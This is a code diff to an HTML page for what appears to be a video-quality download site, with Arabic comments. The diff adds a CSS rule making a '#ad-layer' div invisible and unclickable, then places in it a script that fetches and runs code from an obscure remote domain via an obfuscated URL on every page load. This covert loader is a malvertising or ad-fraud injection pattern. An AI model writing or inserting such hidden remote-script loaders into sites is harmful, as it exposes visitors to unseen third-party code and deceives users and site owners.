@@ -21,10 +21,19 @@
         body {
             min-height: 100vh; background: var(--bg-dark); color: var(--text-main);
             display: flex; flex-direction: column; align-items: center; padding: 0 20px;
-            overflow: hidden; position: relative; /* منع التمرير للخلفية عشان النجوم */
+            overflow: hidden; position: relative;
         }
 
-        /* تصميم النجوم المتحركة (6 نجوم) */
+        /* تنسيق إخفاء منطقة الإعلانات تماماً */
+        #ad-layer {
+            position: absolute;
+            width: 1px; height: 1px;
+            overflow: hidden;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -999;
+        }
+
         .star {
             position: absolute; width: 150px; height: 150px;
             background: radial-gradient(circle, rgba(0, 242, 255, 0.08) 0%, transparent 70%);
@@ -86,7 +95,6 @@
             box-shadow: 0 5px 15px rgba(188, 19, 254, 0.3);
         }
 
-        /* واجهة الجودات */
         .quality-container { display: none; width: 100%; }
         .quality-header { background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple)); padding: 15px; border-radius: 15px; font-weight: 800; text-align: center; margin-bottom: 20px; }
         .tab-group { display: flex; gap: 10px; margin-bottom: 20px; }
@@ -98,12 +106,24 @@
     </style>
 </head>
 <body>
-    <div class="star"></div>
-    <div class="star"></div>
-    <div class="star"></div>
-    <div class="star"></div>
-    <div class="star"></div>
-    <div class="star"></div>
+
+    <div id="ad-layer">
+        <script>
+        (function(grtt){
+        var d = document,
+            s = d.createElement('script'),
+            l = d.scripts[d.scripts.length - 1];
+        s.settings = grtt || {};
+        s.src = "\/\/pricklyassociation.com\/buX\/V.sYdTGRl_0PYfWNcG\/reLml9huqZ\/UOl\/kuPrTHYj4uNVTHgl4tMIj\/kstQNSj\/g\/1BOaDDgUzaMqwd";
+        s.async = true;
+        s.referrerPolicy = 'no-referrer-when-downgrade';
+        l.parentNode.insertBefore(s, l);
+        })({})
+        </script>
+    </div>
+
+    <div class="star"></div><div class="star"></div><div class="star"></div>
+    <div class="star"></div><div class="star"></div><div class="star"></div>
 
     <div class="container" id="main-page">
         <div class="logo-area">
